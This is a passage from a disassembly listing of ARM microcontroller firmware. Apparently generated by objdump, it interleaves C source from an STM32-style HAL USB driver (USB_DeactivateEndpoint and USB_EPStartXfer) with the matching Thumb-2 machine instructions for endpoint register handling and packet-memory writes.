 8006ab6:	881b      	ldrh	r3, [r3, #0]
 8006ab8:	85fb      	strh	r3, [r7, #46]	; 0x2e
 8006aba:	8dfb      	ldrh	r3, [r7, #46]	; 0x2e
 8006abc:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006ac0:	2b00      	cmp	r3, #0
 8006ac2:	d01b      	beq.n	8006afc <USB_DeactivateEndpoint+0x2d4>
 8006ac4:	687a      	ldr	r2, [r7, #4]
 8006ac6:	683b      	ldr	r3, [r7, #0]
 8006ac8:	781b      	ldrb	r3, [r3, #0]
 8006aca:	009b      	lsls	r3, r3, #2
 8006acc:	4413      	add	r3, r2
 8006ace:	881b      	ldrh	r3, [r3, #0]
 8006ad0:	b29b      	uxth	r3, r3
 8006ad2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006ad6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006ada:	85bb      	strh	r3, [r7, #44]	; 0x2c
 8006adc:	687a      	ldr	r2, [r7, #4]
 8006ade:	683b      	ldr	r3, [r7, #0]
 8006ae0:	781b      	ldrb	r3, [r3, #0]
 8006ae2:	009b      	lsls	r3, r3, #2
 8006ae4:	441a      	add	r2, r3
 8006ae6:	8dbb      	ldrh	r3, [r7, #44]	; 0x2c
 8006ae8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006aec:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006af0:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006af4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006af8:	b29b      	uxth	r3, r3
 8006afa:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006afc:	687a      	ldr	r2, [r7, #4]
 8006afe:	683b      	ldr	r3, [r7, #0]
 8006b00:	781b      	ldrb	r3, [r3, #0]
 8006b02:	009b      	lsls	r3, r3, #2
 8006b04:	4413      	add	r3, r2
 8006b06:	881b      	ldrh	r3, [r3, #0]
 8006b08:	857b      	strh	r3, [r7, #42]	; 0x2a
 8006b0a:	8d7b      	ldrh	r3, [r7, #42]	; 0x2a
 8006b0c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006b10:	2b00      	cmp	r3, #0
 8006b12:	d01b      	beq.n	8006b4c <USB_DeactivateEndpoint+0x324>
 8006b14:	687a      	ldr	r2, [r7, #4]
 8006b16:	683b      	ldr	r3, [r7, #0]
 8006b18:	781b      	ldrb	r3, [r3, #0]
 8006b1a:	009b      	lsls	r3, r3, #2
 8006b1c:	4413      	add	r3, r2
 8006b1e:	881b      	ldrh	r3, [r3, #0]
 8006b20:	b29b      	uxth	r3, r3
 8006b22:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006b26:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006b2a:	853b      	strh	r3, [r7, #40]	; 0x28
 8006b2c:	687a      	ldr	r2, [r7, #4]
 8006b2e:	683b      	ldr	r3, [r7, #0]
 8006b30:	781b      	ldrb	r3, [r3, #0]
 8006b32:	009b      	lsls	r3, r3, #2
 8006b34:	441a      	add	r2, r3
 8006b36:	8d3b      	ldrh	r3, [r7, #40]	; 0x28
 8006b38:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006b3c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006b40:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006b44:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006b48:	b29b      	uxth	r3, r3
 8006b4a:	8013      	strh	r3, [r2, #0]
      PCD_RX_DTOG(USBx, ep->num);
 8006b4c:	687a      	ldr	r2, [r7, #4]
 8006b4e:	683b      	ldr	r3, [r7, #0]
 8006b50:	781b      	ldrb	r3, [r3, #0]
 8006b52:	009b      	lsls	r3, r3, #2
 8006b54:	4413      	add	r3, r2
 8006b56:	881b      	ldrh	r3, [r3, #0]
 8006b58:	b29b      	uxth	r3, r3
 8006b5a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006b5e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006b62:	84fb      	strh	r3, [r7, #38]	; 0x26
 8006b64:	687a      	ldr	r2, [r7, #4]
 8006b66:	683b      	ldr	r3, [r7, #0]
 8006b68:	781b      	ldrb	r3, [r3, #0]
 8006b6a:	009b      	lsls	r3, r3, #2
 8006b6c:	441a      	add	r2, r3
 8006b6e:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 8006b70:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006b74:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006b78:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006b7c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006b80:	b29b      	uxth	r3, r3
 8006b82:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint*/
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006b84:	687a      	ldr	r2, [r7, #4]
 8006b86:	683b      	ldr	r3, [r7, #0]
 8006b88:	781b      	ldrb	r3, [r3, #0]
 8006b8a:	009b      	lsls	r3, r3, #2
 8006b8c:	4413      	add	r3, r2
 8006b8e:	881b      	ldrh	r3, [r3, #0]
 8006b90:	b29b      	uxth	r3, r3
 8006b92:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006b96:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006b9a:	84bb      	strh	r3, [r7, #36]	; 0x24
 8006b9c:	687a      	ldr	r2, [r7, #4]
 8006b9e:	683b      	ldr	r3, [r7, #0]
 8006ba0:	781b      	ldrb	r3, [r3, #0]
 8006ba2:	009b      	lsls	r3, r3, #2
 8006ba4:	441a      	add	r2, r3
 8006ba6:	8cbb      	ldrh	r3, [r7, #36]	; 0x24
 8006ba8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006bac:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006bb0:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006bb4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006bb8:	b29b      	uxth	r3, r3
 8006bba:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006bbc:	687a      	ldr	r2, [r7, #4]
 8006bbe:	683b      	ldr	r3, [r7, #0]
 8006bc0:	781b      	ldrb	r3, [r3, #0]
 8006bc2:	009b      	lsls	r3, r3, #2
 8006bc4:	4413      	add	r3, r2
 8006bc6:	881b      	ldrh	r3, [r3, #0]
 8006bc8:	b29b      	uxth	r3, r3
 8006bca:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006bce:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006bd2:	847b      	strh	r3, [r7, #34]	; 0x22
 8006bd4:	687a      	ldr	r2, [r7, #4]
 8006bd6:	683b      	ldr	r3, [r7, #0]
 8006bd8:	781b      	ldrb	r3, [r3, #0]
 8006bda:	009b      	lsls	r3, r3, #2
 8006bdc:	441a      	add	r2, r3
 8006bde:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 8006be0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006be4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006be8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006bec:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006bf0:	b29b      	uxth	r3, r3
 8006bf2:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 8006bf4:	2300      	movs	r3, #0
}
 8006bf6:	4618      	mov	r0, r3
 8006bf8:	3734      	adds	r7, #52	; 0x34
 8006bfa:	46bd      	mov	sp, r7
 8006bfc:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006c00:	4770      	bx	lr

08006c02 <USB_EPStartXfer>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPStartXfer(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8006c02:	b580      	push	{r7, lr}
 8006c04:	b0c2      	sub	sp, #264	; 0x108
 8006c06:	af00      	add	r7, sp, #0
 8006c08:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c0c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006c10:	6018      	str	r0, [r3, #0]
 8006c12:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c16:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c1a:	6019      	str	r1, [r3, #0]
  uint16_t pmabuffer;
  uint16_t wEPVal;
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  /* IN endpoint */
  if (ep->is_in == 1U)
 8006c1c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c20:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c24:	681b      	ldr	r3, [r3, #0]
 8006c26:	785b      	ldrb	r3, [r3, #1]
 8006c28:	2b01      	cmp	r3, #1
 8006c2a:	f040 86b7 	bne.w	800799c <USB_EPStartXfer+0xd9a>
  {
    /*Multi packet transfer*/
    if (ep->xfer_len > ep->maxpacket)
 8006c2e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c32:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c36:	681b      	ldr	r3, [r3, #0]
 8006c38:	699a      	ldr	r2, [r3, #24]
 8006c3a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c3e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c42:	681b      	ldr	r3, [r3, #0]
 8006c44:	691b      	ldr	r3, [r3, #16]
 8006c46:	429a      	cmp	r2, r3
 8006c48:	d908      	bls.n	8006c5c <USB_EPStartXfer+0x5a>
    {
      len = ep->maxpacket;
 8006c4a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c4e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c52:	681b      	ldr	r3, [r3, #0]
 8006c54:	691b      	ldr	r3, [r3, #16]
 8006c56:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
 8006c5a:	e007      	b.n	8006c6c <USB_EPStartXfer+0x6a>
    }
    else
    {
      len = ep->xfer_len;
 8006c5c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c60:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c64:	681b      	ldr	r3, [r3, #0]
 8006c66:	699b      	ldr	r3, [r3, #24]
 8006c68:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
    }

    /* configure and validate Tx endpoint */
    if (ep->doublebuffer == 0U)
 8006c6c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c70:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c74:	681b      	ldr	r3, [r3, #0]
 8006c76:	7b1b      	ldrb	r3, [r3, #12]
 8006c78:	2b00      	cmp	r3, #0
 8006c7a:	d13a      	bne.n	8006cf2 <USB_EPStartXfer+0xf0>
    {
      USB_WritePMA(USBx, ep->xfer_buff, ep->pmaadress, (uint16_t)len);
 8006c7c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c80:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c84:	681b      	ldr	r3, [r3, #0]
 8006c86:	6959      	ldr	r1, [r3, #20]
 8006c88:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c8c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c90:	681b      	ldr	r3, [r3, #0]
 8006c92:	88da      	ldrh	r2, [r3, #6]
 8006c94:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c98:	b29b      	uxth	r3, r3
 8006c9a:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006c9e:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006ca2:	6800      	ldr	r0, [r0, #0]
 8006ca4:	f001 fcb9 	bl	800861a <USB_WritePMA>
      PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 8006ca8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cac:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006cb0:	681b      	ldr	r3, [r3, #0]
 8006cb2:	613b      	str	r3, [r7, #16]
 8006cb4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cb8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006cbc:	681b      	ldr	r3, [r3, #0]
 8006cbe:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006cc2:	b29b      	uxth	r3, r3
 8006cc4:	461a      	mov	r2, r3
 8006cc6:	693b      	ldr	r3, [r7, #16]
 8006cc8:	4413      	add	r3, r2
 8006cca:	613b      	str	r3, [r7, #16]
 8006ccc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cd0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006cd4:	681b      	ldr	r3, [r3, #0]
 8006cd6:	781b      	ldrb	r3, [r3, #0]
 8006cd8:	00da      	lsls	r2, r3, #3
 8006cda:	693b      	ldr	r3, [r7, #16]
 8006cdc:	4413      	add	r3, r2
 8006cde:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006ce2:	60fb      	str	r3, [r7, #12]
 8006ce4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ce8:	b29a      	uxth	r2, r3
 8006cea:	68fb      	ldr	r3, [r7, #12]
 8006cec:	801a      	strh	r2, [r3, #0]
 8006cee:	f000 be1f 	b.w	8007930 <USB_EPStartXfer+0xd2e>
    }
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* double buffer bulk management */
      if (ep->type == EP_TYPE_BULK)
 8006cf2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cf6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006cfa:	681b      	ldr	r3, [r3, #0]
 8006cfc:	78db      	ldrb	r3, [r3, #3]
 8006cfe:	2b02      	cmp	r3, #2
 8006d00:	f040 8462 	bne.w	80075c8 <USB_EPStartXfer+0x9c6>
      {
        if (ep->xfer_len_db > ep->maxpacket)
 8006d04:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d08:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d0c:	681b      	ldr	r3, [r3, #0]
 8006d0e:	6a1a      	ldr	r2, [r3, #32]
 8006d10:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d14:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d18:	681b      	ldr	r3, [r3, #0]
 8006d1a:	691b      	ldr	r3, [r3, #16]
 8006d1c:	429a      	cmp	r2, r3
 8006d1e:	f240 83df 	bls.w	80074e0 <USB_EPStartXfer+0x8de>
        {
          /* enable double buffer */
          PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 8006d22:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d26:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006d2a:	681a      	ldr	r2, [r3, #0]
 8006d2c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d30:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d34:	681b      	ldr	r3, [r3, #0]
 8006d36:	781b      	ldrb	r3, [r3, #0]
 8006d38:	009b      	lsls	r3, r3, #2
 8006d3a:	4413      	add	r3, r2
 8006d3c:	881b      	ldrh	r3, [r3, #0]
 8006d3e:	b29b      	uxth	r3, r3
 8006d40:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006d44:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006d48:	f8a7 3056 	strh.w	r3, [r7, #86]	; 0x56
 8006d4c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d50:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006d54:	681a      	ldr	r2, [r3, #0]
 8006d56:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d5a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d5e:	681b      	ldr	r3, [r3, #0]
 8006d60:	781b      	ldrb	r3, [r3, #0]
 8006d62:	009b      	lsls	r3, r3, #2
 8006d64:	441a      	add	r2, r3
 8006d66:	f8b7 3056 	ldrh.w	r3, [r7, #86]	; 0x56
 8006d6a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006d6e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006d72:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 8006d76:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006d7a:	b29b      	uxth	r3, r3
 8006d7c:	8013      	strh	r3, [r2, #0]

          /* each Time to write in PMA xfer_len_db will */
          ep->xfer_len_db -= len;
 8006d7e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d82:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d86:	681b      	ldr	r3, [r3, #0]
 8006d88:	6a1a      	ldr	r2, [r3, #32]
 8006d8a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d8e:	1ad2      	subs	r2, r2, r3
 8006d90:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d94:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d98:	681b      	ldr	r3, [r3, #0]
 8006d9a:	621a      	str	r2, [r3, #32]

          /* Fill the two first buffer in the Buffer0 & Buffer1 */
          if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 8006d9c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006da0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006da4:	681a      	ldr	r2, [r3, #0]
 8006da6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006daa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dae:	681b      	ldr	r3, [r3, #0]
 8006db0:	781b      	ldrb	r3, [r3, #0]
 8006db2:	009b      	lsls	r3, r3, #2
 8006db4:	4413      	add	r3, r2
 8006db6:	881b      	ldrh	r3, [r3, #0]
 8006db8:	b29b      	uxth	r3, r3
 8006dba:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006dbe:	2b00      	cmp	r3, #0
 8006dc0:	f000 81c7 	beq.w	8007152 <USB_EPStartXfer+0x550>
          {
            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8006dc4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dc8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006dcc:	681b      	ldr	r3, [r3, #0]
 8006dce:	633b      	str	r3, [r7, #48]	; 0x30
 8006dd0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dd4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dd8:	681b      	ldr	r3, [r3, #0]
 8006dda:	785b      	ldrb	r3, [r3, #1]
 8006ddc:	2b00      	cmp	r3, #0
 8006dde:	d177      	bne.n	8006ed0 <USB_EPStartXfer+0x2ce>
 8006de0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006de4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006de8:	681b      	ldr	r3, [r3, #0]
 8006dea:	62bb      	str	r3, [r7, #40]	; 0x28
 8006dec:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006df0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006df4:	681b      	ldr	r3, [r3, #0]
 8006df6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006dfa:	b29b      	uxth	r3, r3
 8006dfc:	461a      	mov	r2, r3
 8006dfe:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006e00:	4413      	add	r3, r2
 8006e02:	62bb      	str	r3, [r7, #40]	; 0x28
 8006e04:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e08:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e0c:	681b      	ldr	r3, [r3, #0]
 8006e0e:	781b      	ldrb	r3, [r3, #0]
 8006e10:	00da      	lsls	r2, r3, #3
 8006e12:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006e14:	4413      	add	r3, r2
 8006e16:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006e1a:	627b      	str	r3, [r7, #36]	; 0x24
 8006e1c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006e1e:	881b      	ldrh	r3, [r3, #0]
 8006e20:	b29b      	uxth	r3, r3
 8006e22:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006e26:	b29a      	uxth	r2, r3
 8006e28:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006e2a:	801a      	strh	r2, [r3, #0]
 8006e2c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e30:	2b3e      	cmp	r3, #62	; 0x3e
 8006e32:	d921      	bls.n	8006e78 <USB_EPStartXfer+0x276>
 8006e34:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e38:	095b      	lsrs	r3, r3, #5
 8006e3a:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006e3e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e42:	f003 031f 	and.w	r3, r3, #31
 8006e46:	2b00      	cmp	r3, #0
 8006e48:	d104      	bne.n	8006e54 <USB_EPStartXfer+0x252>
 8006e4a:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006e4e:	3b01      	subs	r3, #1
 8006e50:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006e54:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006e56:	881b      	ldrh	r3, [r3, #0]
 8006e58:	b29a      	uxth	r2, r3
 8006e5a:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006e5e:	b29b      	uxth	r3, r3
 8006e60:	029b      	lsls	r3, r3, #10
 8006e62:	b29b      	uxth	r3, r3
 8006e64:	4313      	orrs	r3, r2
 8006e66:	b29b      	uxth	r3, r3
 8006e68:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006e6c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006e70:	b29a      	uxth	r2, r3
 8006e72:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006e74:	801a      	strh	r2, [r3, #0]
 8006e76:	e050      	b.n	8006f1a <USB_EPStartXfer+0x318>
 8006e78:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e7c:	2b00      	cmp	r3, #0
 8006e7e:	d10a      	bne.n	8006e96 <USB_EPStartXfer+0x294>
 8006e80:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006e82:	881b      	ldrh	r3, [r3, #0]
 8006e84:	b29b      	uxth	r3, r3
 8006e86:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006e8a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006e8e:	b29a      	uxth	r2, r3
 8006e90:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006e92:	801a      	strh	r2, [r3, #0]
 8006e94:	e041      	b.n	8006f1a <USB_EPStartXfer+0x318>
 8006e96:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e9a:	085b      	lsrs	r3, r3, #1
 8006e9c:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006ea0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ea4:	f003 0301 	and.w	r3, r3, #1
 8006ea8:	2b00      	cmp	r3, #0
 8006eaa:	d004      	beq.n	8006eb6 <USB_EPStartXfer+0x2b4>
 8006eac:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006eb0:	3301      	adds	r3, #1
 8006eb2:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006eb6:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006eb8:	881b      	ldrh	r3, [r3, #0]
 8006eba:	b29a      	uxth	r2, r3
 8006ebc:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006ec0:	b29b      	uxth	r3, r3
 8006ec2:	029b      	lsls	r3, r3, #10
 8006ec4:	b29b      	uxth	r3, r3
 8006ec6:	4313      	orrs	r3, r2
 8006ec8:	b29a      	uxth	r2, r3
 8006eca:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006ecc:	801a      	strh	r2, [r3, #0]
 8006ece:	e024      	b.n	8006f1a <USB_EPStartXfer+0x318>
 8006ed0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ed4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ed8:	681b      	ldr	r3, [r3, #0]
 8006eda:	785b      	ldrb	r3, [r3, #1]
 8006edc:	2b01      	cmp	r3, #1
 8006ede:	d11c      	bne.n	8006f1a <USB_EPStartXfer+0x318>
 8006ee0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ee4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006ee8:	681b      	ldr	r3, [r3, #0]
 8006eea:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006eee:	b29b      	uxth	r3, r3
 8006ef0:	461a      	mov	r2, r3
 8006ef2:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006ef4:	4413      	add	r3, r2
 8006ef6:	633b      	str	r3, [r7, #48]	; 0x30
 8006ef8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006efc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f00:	681b      	ldr	r3, [r3, #0]
 8006f02:	781b      	ldrb	r3, [r3, #0]
 8006f04:	00da      	lsls	r2, r3, #3
 8006f06:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006f08:	4413      	add	r3, r2
 8006f0a:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006f0e:	62fb      	str	r3, [r7, #44]	; 0x2c
 8006f10:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f14:	b29a      	uxth	r2, r3
 8006f16:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8006f18:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 8006f1a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f1e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f22:	681b      	ldr	r3, [r3, #0]
 8006f24:	895b      	ldrh	r3, [r3, #10]
 8006f26:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8006f2a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f2e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f32:	681b      	ldr	r3, [r3, #0]
 8006f34:	6959      	ldr	r1, [r3, #20]
 8006f36:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f3a:	b29b      	uxth	r3, r3
 8006f3c:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8006f40:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006f44:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006f48:	6800      	ldr	r0, [r0, #0]
 8006f4a:	f001 fb66 	bl	800861a <USB_WritePMA>
            ep->xfer_buff += len;
 8006f4e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f52:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f56:	681b      	ldr	r3, [r3, #0]
 8006f58:	695a      	ldr	r2, [r3, #20]
 8006f5a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f5e:	441a      	add	r2, r3
 8006f60:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f64:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f68:	681b      	ldr	r3, [r3, #0]
 8006f6a:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 8006f6c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f70:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f74:	681b      	ldr	r3, [r3, #0]
 8006f76:	6a1a      	ldr	r2, [r3, #32]
 8006f78:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f7c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f80:	681b      	ldr	r3, [r3, #0]
 8006f82:	691b      	ldr	r3, [r3, #16]
 8006f84:	429a      	cmp	r2, r3
 8006f86:	d90f      	bls.n	8006fa8 <USB_EPStartXfer+0x3a6>
            {
              ep->xfer_len_db -= len;
 8006f88:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f8c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f90:	681b      	ldr	r3, [r3, #0]
 8006f92:	6a1a      	ldr	r2, [r3, #32]
 8006f94:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f98:	1ad2      	subs	r2, r2, r3
 8006f9a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f9e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fa2:	681b      	ldr	r3, [r3, #0]
 8006fa4:	621a      	str	r2, [r3, #32]
 8006fa6:	e00e      	b.n	8006fc6 <USB_EPStartXfer+0x3c4>
            }
            else
            {
              len = ep->xfer_len_db;
